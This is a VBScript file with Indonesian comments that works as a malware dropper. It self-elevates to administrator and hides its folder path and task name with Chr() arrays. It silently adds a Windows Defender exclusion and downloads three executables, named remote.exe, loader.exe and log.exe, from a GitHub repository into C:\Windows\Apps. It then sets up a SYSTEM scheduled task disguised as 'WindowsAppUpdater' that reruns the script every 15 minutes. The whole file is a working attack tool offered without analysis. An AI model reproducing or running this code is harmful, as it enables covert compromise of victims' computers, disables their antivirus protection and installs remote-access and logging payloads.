Option Explicit

' --- Self-elevate jika belum admin ---
If Not IsElevated() Then
    CreateObject("Shell.Application").ShellExecute "wscript.exe", _
        Chr(34) & WScript.ScriptFullName & Chr(34), "", "runas", 1
    WScript.Quit
End If

Function IsElevated()
    On Error Resume Next
    Dim objShell, key
    Set objShell = CreateObject("WScript.Shell")
    objShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\_test_elevation", 1, "REG_DWORD"
    If Err.Number = 0 Then
        objShell.RegDelete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\_test_elevation"
        IsElevated = True
    Else
        IsElevated = False
    End If
    On Error GoTo 0
End Function

' --- Obfuscation ringan: bangun string penting dari Chr() ---
Dim shell, fso
Dim strAppsFolder, strDefenderCmd, strTaskName, strTaskCmd
Dim arrAppsPath, arrTaskName, i, tmp

' Build "C:\Windows\Apps"
arrAppsPath = Array(67,58,92,87,105,110,100,111,119,115,92,65,112,112,115)
tmp = ""
For i = LBound(arrAppsPath) To UBound(arrAppsPath)
    tmp = tmp & Chr(arrAppsPath(i))
Next
strAppsFolder = tmp

' Task name (contoh: "WindowsAppUpdater")
arrTaskName = Array(87,105,110,100,111,119,115,65,112,112,85,112,100,97,116,101,114)
tmp = ""
For i = LBound(arrTaskName) To UBound(arrTaskName)
    tmp = tmp & Chr(arrTaskName(i))
Next
strTaskName = tmp

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' --- 1. Buat folder jika belum ada ---
If Not fso.FolderExists(strAppsFolder) Then
    fso.CreateFolder(strAppsFolder)
End If

' --- 2. Tambahkan Defender exclusion untuk folder tersebut ---
strDefenderCmd = "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath '" & strAppsFolder & "'"""
shell.Run strDefenderCmd, 0, True

' --- 3. Unduh 3 file ke C:\Windows\Apps ---
' Ganti URL_FILE_1, URL_FILE_2, URL_FILE_3 dengan URL asli
Dim urls(2), fileNames(2), j, cmdDownload

urls(0) = "https://github.com/elmismedina0126/blablawa/raw/main/remote.exe"
urls(1) = "https://github.com/elmismedina0126/blablawa/raw/main/loader.exe"
urls(2) = "https://github.com/elmismedina0126/blablawa/raw/main/log.exe"

fileNames(0) = "file1.exe"
fileNames(1) = "file2.dll"
fileNames(2) = "file3.dat"

For j = 0 To 2
    Dim fullPath
    fullPath = strAppsFolder & "\" & fileNames(j)
    ' Gunakan PowerShell untuk download (TLS 1.2, hidden)
    cmdDownload = "powershell -NoProfile -WindowStyle Hidden -Command " & _
        """[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " & _
        "Invoke-WebRequest -Uri '" & urls(j) & "' -OutFile '" & fullPath & "' -UseBasicParsing"""
    shell.Run cmdDownload, 0, True
    WScript.Sleep 500  ' jeda kecil antar download
Next

' --- 4. Buat scheduled task untuk persistence setiap 15 menit ---
' Task akan menjalankan script ini lagi setiap 15 menit (tanpa elevasi, tapi script self-elevate)
strTaskCmd = "schtasks /create /tn """ & strTaskName & """ /tr ""wscript.exe //B //NoLogo """ & WScript.ScriptFullName & """ "" " & _
             "/sc minute /mo 15 /ru SYSTEM /rl highest /f"
shell.Run strTaskCmd, 0, True

Set shell = Nothing
Set fso = Nothing
